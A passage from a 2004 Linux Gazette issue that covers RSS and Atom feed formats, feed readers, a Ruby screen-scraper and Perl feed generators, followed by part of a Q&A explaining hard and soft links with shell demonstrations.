    xmlns:dc="http://purl.org/dc/elements/1.1/"
    xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
    xmlns:rdfs="http://www.w3.org/2000/01/rdf-schema#"&gt;

&lt;License rdf:about="http://linuxgazette.net/105/misc/oregan/OPL.rdf.txt"&gt;
  &lt;rdfs:label&gt;OPL&lt;/rdfs:label&gt;
  &lt;dc:title&gt;Open Publication License&lt;/dc:title&gt;
  &lt;rdfs:seeAlso rdf:resource="http://www.opencontent.org/openpub/" /&gt;
&lt;/License&gt;

&lt;/rdf:RDF&gt;
</pre>

<h3>Conclusion</h3>

<p> RDF and the Semantic Web are exciting topics, and I hope I've piqued
someone's interest with this article. Anyone wishing to find out more
may simply Google for RDF, or try the list of <a
 href="misc/oregan/rdf-links.html">bookmarks</a> I accumulated while
reading about RDF.<br>

</p>



<!-- *** BEGIN author bio *** -->
	<!-- *** BEGIN bio *** -->
<hr>
<P>
<img ALIGN="LEFT" ALT="[BIO]" SRC="../gx/2004/authors/oregan.jpg" class="bio">
<em>
<!-- ../110/lg_laundrette.html#nottag.15 :) -->
Jimmy is a single father of one, who enjoys long walks... Oh, right.

<p> Jimmy has been using computers from the tender age of seven, when his father 
inherited an Amstrad PCW8256. After a few brief flirtations with an Atari ST
and numerous versions of DOS and Windows, Jimmy was introduced to Linux in 1998
and hasn't looked back.

<p> In his spare time, Jimmy likes to play guitar and read: not at the same time, 
but the picks make handy bookmarks.
</em>
<br CLEAR="all">
<!-- *** END bio *** -->

<!-- *** END author bio *** -->




<div id="articlefooter">



<p>
Copyright &copy; 2004, <A HREF="../authors/oregan.html">Jimmy O'Regan</A>. Released under the
<a href="http://linuxgazette.net/copying.html">Open Publication license</a>
unless otherwise noted in the body of the article. Linux Gazette is not
produced, sponsored, or endorsed by its prior host, SSC, Inc.
</p>



<p>
Published in Issue 105 of Linux Gazette, August 2004
</p>

</div>

</div>


<div class="content lgcontent">

<a name="oregan2"></a>
<h1>RSS and Feed Readers</h1>
<p id="by"><b>By <A HREF="../authors/oregan.html">Jimmy O'Regan</A></b></p>


</b>
</p>


<p>
<p>  
RSS, feed readers, and news aggregators are a hot topic right now.
Given the massive amount of news available on the net, it makes sense
to be able to read all of the news you're interested in, without having
to check a dozen or more websites. With a good feed reader, you can
subscribe to your favourite news sites - or even to sites you wouldn't
read as often as you would like - and have the software follow the news
for you.
<p>
RSS is one component of the <a href="http://www.w3.org/2001/sw/">Semantic
Web</a> - and the only element currently enjoying widespread use. RSS is
not the only format available for providing news feeds, and the name RSS
even describes two different formats. I say <em>name</em> rather
than <em>acronym</em> because "RSS" has been variously used to mean "RDF
Site Summary", "Rich Site Summary", and "Really Simple Syndication", and
because of this, it is best regarded as a name, to avoid confusion.
<p>
For those who are interested, it was originally RDF Site Summary, and bore
a close resemblance to RSS 1.0. RDF was removed for the first public
version, and it was renamed Rich Site Summary, and Dave Winer (author of
RSS 0.92 and RSS 2.0) subsequently dubbed it Really Simple Syndication.

<h3>Before RSS</h3>
<p>
Before RSS was created, several sites, such as Slashdot, used custom
text files to describe their headlines so other news sites could make
use of them. 

<pre class="code">
1 line for info, other line for date.
%%
&lt;A HREF="http://linux.ie/newsitem.php?n=540"&gt;Article on PAM&lt;/A&gt;
23-July-2004 9:19
%%
&lt;A HREF="http://linux.ie/newsitem.php?n=483"&gt;Articles wanted for Beginners Linux Guide&lt;/A&gt;
4-July-2004 2:55
</pre>
<small>Sample of <a href="http://www.linux.ie/">Linux.ie</a>'s <a
 href="http://www.linux.ie/ilugnews.txt">text backend</a>.</small>

<p> When the "version 4" browsers were released, both included
their own mechanisms for supplying "push content" - sections of
websites which were designed to be subscribed to. If the user
subscribed to the channel, their browser read the channel definition,
and periodically checked that site for updates, downloading the
relevant portions.

<p>
Netscape used a HTML-based "sidebar" (which is still present in Mozilla
etc.), but Microsoft created the "Channel Description Format", which
they <a href="http://www.w3.org/TR/NOTE-CDFsubmit.html">submitted to
the W3C</a>. (<a href="misc/oregan/cdf-sample.cdf.txt">Sample</a>).
Push content didn't catch on at the time, but later work on RSS has,
though not for "push content". (Though Dave Winer did add the 
<tt>&lt;enclosure&gt;</tt> element to RSS 0.92 to allow push in RSS).

<h3>RSS/Atom</h3>
<p>
The original version of RSS was 0.90, designed by Netscape for use on
their "My Netscape" portal. It was originally based on RDF, but
according to the <a href="http://goatee.net/2003/rss-history.html">RSS
timeline</a>, Netscape's marketing people caused it to be stripped
down. Netscape later expanded the format, to be closer to Dave Winer's
<a href="http://davenet.scripting.com/1997/12/15/scriptingNewsInXML">Scripting
News XML</a> (<a href="misc/oregan/lg-scripting_news.xml.txt">Sample</a>).

<p> Winer maintained the RSS specification, but meanwhile, the W3C released
their own RSS specification, based on the original idea of having an
RDF based format for syndication. This removed most of the RSS specific
tags, and used RDF schema to provide analogous tags. Since the W3C
decided to call this RSS 1.0, Winer named his updated version RSS 2.0. 

<p> Because of this confusion, an IETF working group was started to produce
an alternate format, called Atom (formerly Echo), which, unfortunately,
only served to add to the confusion. 

<p> RDF 2.0 is backward-compatible with RSS 0.92, which is
backward-compatible with RSS 0.91. The main difference between RSS 2.0 and
RSS 1.0 is that RSS 1.0 removes all terms from the RSS schema which are
available in other schema - in place of the <tt>&lt;title&gt;</tt> element,
for example, you could include a reference to the Dublin Core schema, and
use <tt>&lt;dc:title&gt;</tt> instead. RSS 2.0 can be extended with RDF
schema - as (to the best of my knowledge) can Atom.

<p> There are also websites available which will convert feeds to your
preferred format, for example <a
 href="http://www.2rss.com/software.php?page=atom2rss">2rss.com</a> and
<a href="http://www.tnl.net/blog/entry/RSS2Necho_is_now_RSS2Atom">RSS2Atom</a>.
Linux Gazette can then be accessed as an Atom feed from <a
 href="http://www.tnl.net/channels/rss2atom/http://linuxgazette.net/lg.rss">http://www.tnl.net/channels/rss2atom/http://linuxgazette.net/lg.rss</a>.<br>

<h3>Feed Readers</h3>

<h4>Liferea</h4>

<img alt="Liferea in action" title="Liferea in action"
src="misc/oregan/liferea.png" align="left" hspace="20">

<p style="margin: 50px 0px"> Liferea is my current favourite feed reader.
It features a UI that is similar to most of the popular Windows readers,
supports several formats (including CDF!), and integrates nicely with the
system tray. When minimised to the tray, it is very unassuming. When new
news arrives, the icon is coloured; otherwise, it's greyed. (Though the
version I'm using has a problem with my Blogspot Atom feed - <a
href="misc/oregan/blogspot.xml.txt">try it</a> if you're curious).

<p><img alt="Snownews" title="Snownews" src="misc/oregan/snownews.png"
align="right" hspace="20">
<p style="margin-top: 200px">
<h4>Snownews</h4>
<a href="http://home.kcore.de/%7Ekiza/software/snownews/">Snownews</a>
is an ncurses based feed reader for the console. It handles RSS 0.9x, 0.1
and 0.2, but can be extended with scripts to read other formats.  Snownews
has an excellent interface, reminiscent of Pine and Pico.  Snownews starts
with a blank screen. Various commands are bound to single key presses
(which may be configured by editing <tt>.snownews/keybindings</tt>). To add
a feed, type '<tt>a</tt>', and enter the URL when prompted. To open an item
in lynx (or whatever browser you choose to enter in
<tt>.snownews/browser</tt>), press '<tt>o</tt>'. 


<p> Newer versions of both Liferea and Snownews allow you to use the output
of another program as a feed source. RSSscrape, which I'll look at in a
little while, is a great tool to use with either of these programs.

<h4>Devedge RSS Ticker</h4>

Ben pointed me in the direction of <a
 href="http://devedge.netscape.com/viewsource/2003/rss-toolbar-ticker/">Netscape
Devedge's RSS Ticker</a>. This is a very simple RSS ticker, which was
created as an example for a Devedge article. By default, it only
supports 3 news sites - Devedge, CNet, and The New York Times. There
are better tickers available for Mozilla.

<h4>URSS</h4>

<img alt="URSS" title="URSS" src="misc/oregan/urss.png" align="left" hspace="20" vspace="20">

<p style="margin-top: 50px"> <a href="http://urss.mozdev.org/">URSS</a> is
another Mozilla-based news ticker, originally based on the Devedge ticker.
It, however, allows you to add your own feeds, and adds a sidebar that
allows headlines and descriptions to be read. I don't use it much though,
because it's unable to read LG's feed, though this may not be an issue by
the time this article hits the newsstands, as I found invalid code in the
RSS which I've fixed.

<br clear="all">

<h3>A look at various feeds</h3>

<h4>RSS 0.9x</h4>

<p> LG uses the RSS 0.91 format, the original format <a
href="http://my.netscape.com/publish/formats/rss-spec-0.91.html">designed
by Netscape</a>. This is an excerpt from last month's issue:
<pre class="code">
&lt;rss version="0.91"&gt;

&lt;channel&gt;
&lt;title&gt;Linux Gazette&lt;/title&gt;
&lt;link&gt;http://linuxgazette.net&lt;/link&gt;
&lt;description&gt;An e-zine dedicated to making Linux just a little bit more fun.
Published the first day of every month.&lt;/description&gt;
&lt;language&gt;en&lt;/language&gt;
&lt;webMaster&gt;(email omitted)&lt;/webMaster&gt;
&lt;image&gt;
&lt;title&gt;Linux Gazette RSS&lt;/title&gt;
&lt;url&gt;http://linuxgazette.net/gx/2004/newlogo-blank-100-gold2.jpg&lt;/url&gt;
&lt;link&gt;http://www.linuxgazette.net/&lt;/link&gt;
&lt;/image&gt;

&lt;issue&gt;104&lt;/issue&gt;
&lt;month&gt;July&lt;/month&gt;
&lt;year&gt;2004&lt;/year&gt;

&lt;item&gt;
&lt;title&gt;The Mailbag&lt;/title&gt;
&lt;link&gt;http://linuxgazette.net/104/lg_mail.html&lt;/link&gt;
&lt;description&gt;&lt;/description&gt;
&lt;/item&gt;

&lt;/channel&gt;
&lt;/rss&gt;
</pre>

<p> Pretty straightforward, isn't it? From issue 105 on, there are a few
extra bits. The <tt>&lt;webMaster&gt;</tt> tag has been added to complement 
the <tt>&lt;managingEditor&gt;</tt> tag, and the <tt>&lt;image&gt;</tt> tag has 
the optional <tt>&lt;height&gt;</tt> and <tt>&lt;width&gt;</tt> tags:

<pre class="code">
&lt;image&gt;
&lt;title&gt;Linux Gazette RSS&lt;/title&gt;
&lt;url&gt;http://linuxgazette.net/gx/2004/newlogo-blank-100-gold2.jpg&lt;/url&gt;
&lt;link&gt;http://www.linuxgazette.net/&lt;/link&gt;
<b>&lt;height&gt;42&lt;/height&gt;</b>
<b>&lt;width&gt;99&lt;/width&gt;</b>
&lt;/image&gt;
</pre>

<p> One feature which would have been nifty is <tt>&lt;textinput&gt;</tt>, which
allows you to search a site from your feed reader. Unfortunately, since
LG uses Google's site search, we can't use it as that requires an extra
parameter which RSS doesn't support.

<p> We'll take this heavily pruned Google search URL:
<tt>http://www.google.com/search?q=test</tt>. Here's how a textinput for that
URL would look:

<pre class="code">
&lt;textinput&gt;
&lt;title&gt;Search&lt;/title&gt;
&lt;description&gt;Search Google.&lt;/description&gt;
&lt;name&gt;q&lt;/name&gt;
&lt;link&gt;http://www.google.com/search&lt;/link&gt;
&lt;/textinput&gt;
</pre>

<p>One issue with LG's RSS feed is that <tt>&lt;issue&gt;</tt>, 
<tt>&lt;month&gt;</tt> and <tt>&lt;year&gt;</tt> are not valid tags. From next 
issue on, this information is in the channel description - it was unused 
before anyway.

<p> Our <tt>&lt;description&gt;</tt> now looks like this:

<pre class="code">
&lt;description&gt;An e-zine dedicated to making Linux just a little
bit more fun.
Published the first day of every month.
&amp;lt;br&amp;gt;
Issue 105: August, 2004
&lt;/description&gt;
</pre>

<p>Note the use of escaped HTML - this can be used in any 
<tt>&lt;description&gt;</tt>.

<h4>RSS 0.92 and 2.0</h4>

<p><a href="http://backend.userland.com/rss092">RSS 0.92</a> is Dave
Winer's expanded version of RSS 0.91. The main difference between RSS
0.91 and 0.92 is that several tags were made optional, and the limit of
15 items per feed was removed. Some experimental tags were added, but
they're not really useful for the majority of people - aside from the
<tt>&lt;enclosure&gt;</tt> element I already mentioned, there is also a
<tt>&lt;cloud&gt;</tt> element, which is used to provide a link to an XML-RPC or
SOAP service, which is used to tell aggregators that the feed has been
updated.

<p>RSS 2.0 builds on RSS 0.92. I couldn't make out what the differences
between RSS 2.0 and 0.92 were, though.

<h4>RSS 1.0</h4>

<p>RSS 1.0 is also backward-compatible with RSS 0.91, though instead of
adding new tags to support new concepts, a different RDF schema may be
referenced. Slashdot, for example, has its own schema which represents
the section, department ("from the do-the-shake-and-vac dept" etc.),
the number of comments, and the "hit parade".

<p> The first difference you'll notice is that the root element is
<tt>&lt;rdf:RDF&gt;</tt> instead of <tt>&lt;rss&gt;</tt>. Another difference 
is that the <tt>&lt;channel&gt;</tt>, <tt>&lt;image&gt;</tt> and 
<tt>&lt;item&gt;</tt> tags now have <tt>rdf:about</tt> attributes, and that 
the <tt>&lt;image&gt;</tt> and <tt>&lt;item&gt;</tt> tags must now
appear outside of the <tt>&lt;channel&gt;</tt> tag, and must have matching tags
with rdf:resource tags within the channel element (this applies to the
<tt>&lt;textinput&gt;</tt> element too).

<h4>Atom</h4>

<p> Atom was designed out of frustration with the competing versions of
RSS. It also shows that it was designed after blogs became popular, whereas
RSS predates this. Atom feeds, as is to be expected, are similar to RSS
feeds.

<p> Here's a sample Atom feed:

<pre class="code">
&lt;?xml version='1.0' encoding='utf-8' ?&gt;
&lt;!--&nbsp; If you are running a bot please visit this policy page
outlining rules you must respect.
http://www.livejournal.com/bots/  --&gt;
&lt;feed version='0.3' xmlns='http://purl.org/atom/ns#'&gt;
&lt;title mode='escaped'&gt;Dung by any other name...&lt;/title&gt;
&lt;tagline mode='escaped'&gt;jimregan&lt;/tagline&gt;
&lt;link rel='alternate' type='text/html'
href='http://www.livejournal.com/users/jimregan/' /&gt;
&lt;modified&gt;2004-07-26T01:12:32Z&lt;/modified&gt;
&lt;link rel='service.feed' type='application/x.atom+xml'
title='AtomAPI-enabled feed'
href='http://www.livejournal.com/interface/atomapi/jimregan/feed'/&gt;
  &lt;entry&gt;
    &lt;title mode='escaped'&gt;Sample title&lt;/title&gt;
    &lt;id&gt;urn:lj:livejournal.com:atom1:jimregan:4251&lt;/id&gt;
    &lt;link rel='alternate' type='text/html'
    href='http://www.livejournal.com/users/jimregan/4251.html' /&gt;
    &lt;issued&gt;2004-07-26T02:12:00&lt;/issued&gt;
    &lt;modified&gt;2004-07-26T01:12:32Z&lt;/modified&gt;
    &lt;author&gt;
      &lt;name&gt;jimregan&lt;/name&gt;
    &lt;/author&gt;
    &lt;content type='text/html' mode='escaped'&gt;A simple example.&lt;/content&gt;
  &lt;/entry&gt;
&lt;/feed&gt;
</pre>
<p> Atom is not as simple as RSS - even RSS 1.0, with RDF, is easier. It's also
much newer than RSS, and not as well documented, or as well supported. It is,
however, the only feed type supported by <a href="http://www.blogger.com">Blogger</a>,
Google's Blog site, so we can expect to see greater support for it.

<p> I tried to set up an Atom creator for LG, so we can support the three feed
types, but none of the feed readers I have installed were able to display 
anything useful from my feed. If you're skeptical, I have <a 
href="misc/oregan/lg.atom.xml.txt">included it</a> - you can <a 
href="http://feedvalidator.org/check.cgi?url=http%3A%2F%2Flinuxgazette.net%2F105%2Fmisc%2Foregan%2Flg.atom.xml.txt">check 
it</a> using <a href="http://feedvalidator.org">FeedValidator.org</a>.

<h3>Screen Scrapers</h3>

<p> A screen scraper is a program which checks a website for certain 
information. In this context, we want to take a site which lacks a feed, and
generate one - because we're all sold on the idea of feed readers now, being
the ultra-hip people that we are, right? - but they are also used to check
stock prices, flight details, auctions, etc. - there are several companies
who base their entire business around scraping other sites. 

<p> So, basically, a screen scraper is a script which grabs a webpage, runs it
through a regex or two, and spits out results in the desired format.

<p> I'm still stuck in Perl-novice land, and since I don't want to place too
much extra pressure on <a href="../authors/okopnik.html">Ben</a>, our 
resident Perl guru, I'll use <a 
href="http://rubyforge.org/projects/rssscraper/">RSSscraper</a>, a project
which provides the framework for scrapers, including the RSS generation code,
so you have little to do other than provide the URL and regex. (Plus, it's
written in Ruby, so I get to horrify <a href="../authors/adam.html">Thomas</a>
with the poor quality of my code instead (\o/) - check <a 
href="misc/oregan/regex-care.html">this</a> to see what I'm talking about!

<p> So, here's my example, formatted slightly to fit on the screen. (<a 
href="misc/oregan/Ben.scraper.rb">Text version</a>).

<pre class="code">
class <b>Ben</b>Scanner &lt; RSSscraper::AbstractScanner
	def initialize
		<b>@url_string = 'http://okopnik.freeshell.org/blog/blog.cgi'
		@url_proper = 'http://okopnik.freeshell.org/blog/'
		@postsRE = /div class="HeadText"&gt; \n\n([^&lt;]*)\n\n
		&lt;\/div&gt;\n&lt;\/td&gt;\n&lt;\/tr&gt;\n\n&lt;tr&gt;\n
		&lt;td bgcolor="#fdfded" class="UsualText" valign="middle"&gt;
		\n\n&lt;br&gt;&lt;b&gt;([^&lt;]*)&lt;\/b&gt;&lt;p&gt;\n\n
		([^\]]*)\n\n&lt;p&gt;\[ &lt;a href="([^\s\t\r\n\f]*)"&gt;
		([^&lt;]*)&lt;\/a&gt;/m</b>
	end

	def find_items
		require 'cgi'
		items = Array.new
		request_feed.scan(@postsRE).each{ <b>|date, title, content, comments_link, comments|</b>
                        items &lt;&lt; { :title =&gt; title,
				   :description =&gt; "#{CGI::escapeHTML(content)}",
                                   :comments_link =&gt; @url_proper+comments_link,
				   :comments =&gt; @url_proper+comments_link
                                 }
		}
		items
	end
end

class <b>Ben</b> &lt; RSSscraper::AbstractScraper

	def scanner
		<b>Ben</b>Scanner.new
	end

	def description
	{
	        :link =&gt; <b>'http://okopnik.freeshell.org/blog/blog.cgi'</b>,
		:title =&gt; <b>'The Bay of Tranquility'</b>,
		:description =&gt; <b>'Ben Okopnik\'s blog.'</b>,
		:language =&gt; 'en-us',
		:generator =&gt; generator_string
	}	
	end

end
</pre>	

<p> So, looking at the parts in bold, you can probably guess that you need
to customise the main class name, and the scanner class. The file must be
named <tt>[Foo].scraper.rb</tt>, and these classes are then named 
<tt>[Foo]</tt> and <tt>[Foo]Scanner</tt>. 

<p> After that, the items in <tt>description</tt> are pretty obvious. 
<tt>@url_string</tt> is the URL of the site to be parsed; <tt>@url_proper</tt>
is only required in this case because the comments link is not a string
appended to the blog link, as it is in most cases. <tt>@postsRE</tt> is the 
regex, and <tt>date</tt>, etc. are the elements we wish to extract.

<p> The regex is the hardest part, and even at that, it's not too hard - just
remember that the parts you wish to extract go in parentheses.

<p> When you've filled in the blanks, you place it in your scrapers directory,
and run it like so: <tt>scrape.rb [Foo]</tt>. 

<h3>Generating RSS</h3>

<p> Well... I lied about wanting to spare Ben - I'm going to show a simple
example of an RSS generator in Perl. 

<p> <a href="http://cpan.org">CPAN</a> has a great module for generating
RSS (both 1.0 and 0.9x), called <a href="http://search.cpan.org/~kellan/XML-RSS-1.04/">XML::RSS</a>.

<p> Let's look at a sample for generating RSS 0.91 (<a href="misc/oregan/rss-09.pl.txt">Text</a>, 
<a href="misc/oregan/perl-test-0.9.rss.txt">sample output</a>).

<pre class="code">
#!/usr/bin/perl -w

use strict;
use XML::RSS;

my $rss = new XML::RSS (version =&gt; '0.91');
$rss-&gt;channel(title          =&gt; 'Linux Gazette',
              link           =&gt; 'http://linuxgazette.net',
              language       =&gt; 'en',
              description    =&gt; 'An e-zine dedicated to making Linux just a little bit more fun.
Published the first day of every month.
&lt;br&gt;Issue 105: August, 2004',
              copyright      =&gt; 'Copyright (c) 1996-2004 the Editors of Linux Gazette',
              managingEditor =&gt; 'email@here.com',
              webMaster      =&gt; 'email@here.com');

$rss-&gt;image(title  =&gt; 'Linux Gazette',
            url    =&gt; 'http://linuxgazette.net/gx/2004/newlogo-blank-100-gold2.jpg',
            link   =&gt; 'http://www.linuxgazette.net/',
            width  =&gt; '99',
            height =&gt; '42');
              
$rss-&gt;add_item(title       =&gt; 'Securing a New Linux Installation',
               link        =&gt; 'http://linuxgazette.net/105/odonovan.html',
               description =&gt; 'By Barry O\'Donovan');

$rss-&gt;save("perl-test.rss");
</pre>

<p> To create an RSS 1.0 feed, we could simply take that example, and change
the version to 1.0 (which would look like <a 
href="misc/oregan/perl-test-1.0basic.rss.txt">this</a>), but with RSS 1.0 we 
can add different schema. XML::RSS uses Dublin Core and dmoz taxonomies by
default (you can, of course, easily add others, but I'm not going to cover 
that).

<p>(<a href="misc/oregan/rss-10.pl.txt">Text</a> and <a 
href="misc/oregan/perl-test-1.0.rss.txt">sample output</a>)

<pre class="code">
#!/usr/bin/perl -w

use strict;
use XML::RSS;

my $rss = new XML::RSS (version =&gt; '1.0');
$rss-&gt;channel(title          =&gt; 'Linux Gazette',
              link           =&gt; 'http://linuxgazette.net',
              description    =&gt; 'An e-zine dedicated to making Linux just a little bit more fun.
Published the first day of every month.
&lt;br&gt;Issue 105: August, 2004',
              #XML::RSS will do the dc stuff for us, but just to illustrate...
              dc =&gt; {rights    =&gt; 'Copyright (c) 1996-2004 the Editors of Linux Gazette',
                     creator   =&gt; 'email@here.com',
                     language  =&gt; 'en',},
              taxo =&gt; ['http://dmoz.org/Computers/Software/Operating_Systems/Linux/']);

$rss-&gt;image(title  =&gt; 'Linux Gazette',
            url    =&gt; 'http://linuxgazette.net/gx/2004/newlogo-blank-100-gold2.jpg',
            link   =&gt; 'http://www.linuxgazette.net/',
            width  =&gt; '99',
            height =&gt; '42');
              
$rss-&gt;add_item(title       =&gt; 'Securing a New Linux Installation',
               link        =&gt; 'http://linuxgazette.net/105/odonovan.html',
               description =&gt; 'By Barry O\'Donovan');

$rss-&gt;save("perl-test.rss");
</pre>

<!-- Please leave the mailto: intact - I doubt I'll notice any new spam -
it'd be a drop in the ocean! -->
<p> And that's it. I hope some of you found this interesting, and I know from
experience that if I've made any mistakes you won't hesitate to <a 
href="mailto:jimregan@o2.ie">contact me</a>. Take care.



</p>



<!-- *** BEGIN author bio *** -->
	<!-- *** BEGIN bio *** -->
<hr>
<P>
<img ALIGN="LEFT" ALT="[BIO]" SRC="../gx/2004/authors/oregan.jpg" class="bio">
<em>
<!-- ../110/lg_laundrette.html#nottag.15 :) -->
Jimmy is a single father of one, who enjoys long walks... Oh, right.

<p> Jimmy has been using computers from the tender age of seven, when his father 
inherited an Amstrad PCW8256. After a few brief flirtations with an Atari ST
and numerous versions of DOS and Windows, Jimmy was introduced to Linux in 1998
and hasn't looked back.

<p> In his spare time, Jimmy likes to play guitar and read: not at the same time, 
but the picks make handy bookmarks.
</em>
<br CLEAR="all">
<!-- *** END bio *** -->

<!-- *** END author bio *** -->




<div id="articlefooter">



<p>
Copyright &copy; 2004, <A HREF="../authors/oregan.html">Jimmy O'Regan</A>. Released under the
<a href="http://linuxgazette.net/copying.html">Open Publication license</a>
unless otherwise noted in the body of the article. Linux Gazette is not
produced, sponsored, or endorsed by its prior host, SSC, Inc.
</p>



<p>
Published in Issue 105 of Linux Gazette, August 2004
</p>

</div>

</div>


<div class="content lgcontent">

<a name="pitcher"></a>
<h1>Q &amp; A: The difference between hard and soft links</h1>
<p id="by"><b>By <A HREF="../authors/pitcher.html">Lew Pitcher</A></b></p>


</b>
</p>


<p>
<p> I participate in about 30 usenet newsgroups, and in a virtual LUG, and
a number of questions keep coming up. I've answered a few of these
questions often enough to have 'canned' an answer, which I modify,
depending on the circumstances.

<p> Here's one, now...

<p> <strong>Q:</strong> Can someone give me a simple explanation of the
difference between a soft link and a hard link?  The documentation I've
read mention these links but make no strong explanations of their meaning
and how/when to use them.  Thanks!

<p> <strong>A:</strong> OK, I'll give it a try...

<p> Unix files consist of two parts: the data part and the filename part.

<p> The data part is associated with something called an 'inode'. The inode
carries the map of where the data is, the file permissions, etc. for the
data.
   
<pre class="code">

                               .---------------&gt; ! data ! ! data ! etc
                              /                  +------+ !------+
        ! permbits, etc ! data addresses !
        +------------inode---------------+

</pre>

<p> The filename part carries a name and an associated inode number.

<pre class="code">
                         .--------------&gt; ! permbits, etc ! addresses !
                        /                 +---------inode-------------+
        ! filename ! inode # !
        +--------------------+
</pre>

<p> More than one filename can reference the same inode number; these files are
said to be 'hard linked' together.
   
<pre class="code">
        ! filename ! inode # !
        +--------------------+
                        \
                         &gt;--------------&gt; ! permbits, etc ! addresses !
                        /                 +---------inode-------------+
        ! othername ! inode # !
        +---------------------+
</pre>

<p> On the other hand, there's a special file type whose data part carries
a path to another file. Since it is a special file, the OS recognizes the
data as a path, and redirects opens, reads, and writes so that, instead of
accessing the data within the special file, they access the data in the
file <u>named</u> by the data in the special file. This special file is
called a 'soft link' or a 'symbolic link' (aka a 'symlink').

   
<pre class="code">
        ! filename ! inode # !
        +--------------------+
                        \
                         .-------&gt; ! permbits, etc ! addresses !
                                   +---------inode-------------+
                                                      /
                                                     /
                                                    /
    .----------------------------------------------'
   ( 
    '--&gt;  !"/path/to/some/other/file"! 
          +---------data-------------+
                  /                      }
    .~ ~ ~ ~ ~ ~ ~                       }-- (redirected at open() time)
   (                                     }
    '~~&gt; ! filename ! inode # !
         +--------------------+
                         \
                          '------------&gt; ! permbits, etc ! addresses !
                                         +---------inode-------------+
                                                            /
                                                           /
     .----------------------------------------------------'
    (
     '-&gt;  ! data !  ! data ! etc.
          +------+  +------+ 

</pre>
	  
<p> Now, the filename part of the file is stored in a special file of its own
along with the filename parts of other files; this special file is called a
directory. The directory, as a file, is just an array of filename parts of
other files.
   
<p> When a directory is built, it is initially populated with the filename parts
of two special files: the '.' and '..' files. The filename part for the '.'
file is populated with the inode# of the directory file in which the entry
has been made; '.' is a hardlink to the file that implements the current
directory.
   
<p> The filename part for the '..' file is populated with the inode# of the
directory file that contains the filename part of the current directory
file. '..' is a hardlink to the file that implements the immediate parent
of the current directory.

<p> The 'ln' command knows how to build hardlinks and softlinks; the
'mkdir' command knows how to build directories (the OS takes care of the
above hardlinks).

<p> There are restrictions on what can be hardlinked (both links must reside on
the same filesystem, the source file must exist, etc.) that are not
applicable to softlinks (source and target can be on seperate file systems,
source does not have to exist, etc.). OTOH, softlinks have other
restrictions not shared by hardlinks (additional I/O necessary to complete
file access, additional storage taken up by softlink file's data, etc.)

<p> In other words, there's tradeoffs with each.

<p> Now, let's demonstrate some of this...

<h3>ln in action</h3>
   
<p> Let's start off with an empty directory, and create a file in it
   
<pre class="code">
~/directory $ ls -lia 
total 3
  73477 drwxr-xr-x   2 lpitcher users        1024 Mar 11 20:16 .
  91804 drwxr-xr-x  29 lpitcher users        2048 Mar 11 20:16 ..

~/directory $ echo "This is a file" &gt;basic.file

~/directory $ ls -lia 
total 4
  73477 drwxr-xr-x   2 lpitcher users        1024 Mar 11 20:17 .
  91804 drwxr-xr-x  29 lpitcher users        2048 Mar 11 20:16 ..
  73478 -rw-r--r--   1 lpitcher users          15 Mar 11 20:17 basic.file

~/directory $ cat basic.file
This is a file
</pre>

Now, let's make a hardlink to the file

<pre class="code">   
~/directory $ ln basic.file hardlink.file

~/directory $ ls -lia 
total 5
  73477 drwxr-xr-x   2 lpitcher users        1024 Mar 11 20:20 .
  91804 drwxr-xr-x  29 lpitcher users        2048 Mar 11 20:18 ..
  73478 -rw-r--r--   2 lpitcher users          15 Mar 11 20:17 basic.file
  73478 -rw-r--r--   2 lpitcher users          15 Mar 11 20:17 hardlink.file

~/directory $ cat hardlink.file
This is a file
</pre>

<p>We see that:
<ol type="a">
 <li><tt>hardlink.file</tt> shares the same inode (73478) as basic.file</li>
 <li><tt>hardlink.file</tt> shares the same data as basic.file</li>
</ol>
<p>If we change the permissions on <tt>basic.file</tt>:
   
<pre class="code">
~/directory $ chmod a+w basic.file

~/directory $ ls -lia 
total 5
  73477 drwxr-xr-x   2 lpitcher users        1024 Mar 11 20:20 .
  91804 drwxr-xr-x  29 lpitcher users        2048 Mar 11 20:18 ..
  73478 -rw-rw-rw-   2 lpitcher users          15 Mar 11 20:17 basic.file
  73478 -rw-rw-rw-   2 lpitcher users          15 Mar 11 20:17 hardlink.file
</pre>
     
<p> then the same permissions change on <tt>hardlink.file</tt>.

<p>The two files (<tt>basic.file</tt> and <tt>hardlink.file</tt>) share the same inode and data,
but have different file names.
   
<p>Let's now make a softlink to the original file:
   
<pre class="code">
~/directory $ ln -s basic.file softlink.file

~/directory $ ls -lia 
total 5
  73477 drwxr-xr-x   2 lpitcher users        1024 Mar 11 20:24 .
  91804 drwxr-xr-x  29 lpitcher users        2048 Mar 11 20:18 ..
  73478 -rw-rw-rw-   2 lpitcher users          15 Mar 11 20:17 basic.file
  73478 -rw-rw-rw-   2 lpitcher users          15 Mar 11 20:17 hardlink.file
  73479 lrwxrwxrwx   1 lpitcher users          10 Mar 11 20:24 softlink.file -&gt; basic.file

~/directory $ cat softlink.file
This is a file
</pre>

<p> Here, we see that although <tt>softlink.file</tt> accesses the same data as
<tt>basic.file</tt> and <tt>hardlink.file</tt>, it does not share the same inode (73479 vs
73478), nor does it exhibit the same file permissions. It does show a new
permission bit: the 'l' (softlink) bit.
   
<p> If we delete <tt>basic.file</tt>:
   
<pre class="code">
~/directory $ rm basic.file

~/directory $ ls -lia 
total 4
  73477 drwxr-xr-x   2 lpitcher users        1024 Mar 11 20:27 .
  91804 drwxr-xr-x  29 lpitcher users        2048 Mar 11 20:18 ..
  73478 -rw-rw-rw-   1 lpitcher users          15 Mar 11 20:17 hardlink.file
  73479 lrwxrwxrwx   1 lpitcher users          10 Mar 11 20:24 softlink.file -&gt; basic.file
</pre>
   
<p> then we lose the ability to access the linked data through the softlink:
   
<pre class="code">
~/directory $ cat softlink.file
cat: softlink.file: No such file or directory
</pre>

<p> However, we still have access to the original data through the hardlink:

<pre class="code">
~/directory $ cat hardlink.file
This is a file
</pre>

<p> You will notice that when we deleted the original file, the hardlink didn't
vanish. Similarly, if we had deleted the softlink, the original file wouldn't
have vanished. 

<h3>A further note with respect to hardlink files</h3>

<p> When deleting files, the data part isn't disposed of until all the filename
parts have been deleted. There's a count in the inode that indicates how
many filenames point to this file, and that count is decremented by 1 each
time one of those filenames is deleted. When the count makes it to zero,
the inode and its associated data are deleted.

<p> By the way, the count also reflects how many times the file has been opened
without being closed (in other words, how many references to the file are
still active). This has some ramifications which aren't obvious at first:
you can delete a file so that no "filename" part points to the inode,
without releasing the space for the data part of the file, because the file
is still open.

<p> Have you ever found yourself in this position: you notice that
<tt>/var/log/messages</tt> (or some other syslog-owned file) has grown too big, and
you

